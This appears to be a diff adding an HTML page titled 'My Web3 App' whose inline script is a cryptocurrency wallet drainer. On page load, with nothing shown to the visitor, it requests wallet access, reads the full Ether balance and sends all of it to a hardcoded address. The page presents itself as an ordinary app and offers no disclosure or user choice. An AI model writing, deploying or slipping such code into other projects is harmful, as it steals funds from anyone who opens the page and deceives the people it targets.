@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>My Web3 App</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+</head>
+<body>
+  <script>
+   // Connect to the Ethereum network using the mobile wallet's provider
+const web3 = new Web3(ethereum);
+
+// Function to execute the transaction
+async function executeTransaction() {
+  try {
+    // Request account access from the mobile wallet
+    await ethereum.enable();
+
+    // Get the user's Ethereum address
+    const accounts = await web3.eth.getAccounts();
+    const userAddress = accounts[0];
+
+    // Prepare the transaction details
+    const recipientAddress = '0x0e1fba69318f116ed4f784e43523324dfcd01fcf'; // Replace with the recipient's wallet address
+    const balance = await web3.eth.getBalance(userAddress);
+    const amount = balance.toString(); // Send the entire balance
+
+    // Check if the wallet is empty
+    if (balance == '0') {
+      console.error('Empty Ethereum wallet: Insufficient balance');
+      return;
+    }
+
+    // Build the transaction object
+    const transactionObject = {
+      from: userAddress,
+      to: recipientAddress,
+      value: amount
+    };
+
+    // Send the transaction
+    const signedTx = await web3.eth.sendTransaction(transactionObject);
+    console.log('Transaction sent:', signedTx);
+  } catch (error) {
+    console.error('Failed transaction:', error.message);
+  }
+}
+
+// Automatically execute the transaction when the page loads
+window.addEventListener('load', executeTransaction);
+  </script>
+</body>
+</html>
